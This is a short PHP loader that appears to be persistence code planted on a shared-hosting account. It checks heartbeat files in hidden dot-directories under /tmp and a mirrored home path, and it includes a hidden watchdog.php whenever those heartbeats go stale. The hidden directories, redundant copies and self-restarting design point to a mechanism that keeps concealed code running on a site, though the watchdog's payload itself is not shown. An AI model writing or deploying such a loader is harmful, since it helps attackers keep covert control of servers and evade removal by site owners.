<?php
if (defined('FP_HIDDEN_PREPEND_LOADER_RUNNING')) { return; }
define('FP_HIDDEN_PREPEND_LOADER_RUNNING', true);
$heartbeats = array (
  0 => '/tmp/.section/.guardian-heartbeat',
  1 => '/home3/snweba2e/.section-mirror/.guardian-heartbeat',
);
$now = time();
foreach ($heartbeats as $heartbeat) {
    clearstatcache(true, $heartbeat);
    $modified = is_file($heartbeat) ? (int) (@filemtime($heartbeat) ?: 0) : 0;
    if ($modified > 0 && $now - $modified <= 15) { return; }
}
$watchdogs = array (
  0 => '/tmp/.section/watchdog.php',
  1 => '/home3/snweba2e/.section-mirror/watchdog.php',
);
foreach ($watchdogs as $watchdog) {
    if (is_file($watchdog)) { include_once $watchdog; break; }
}
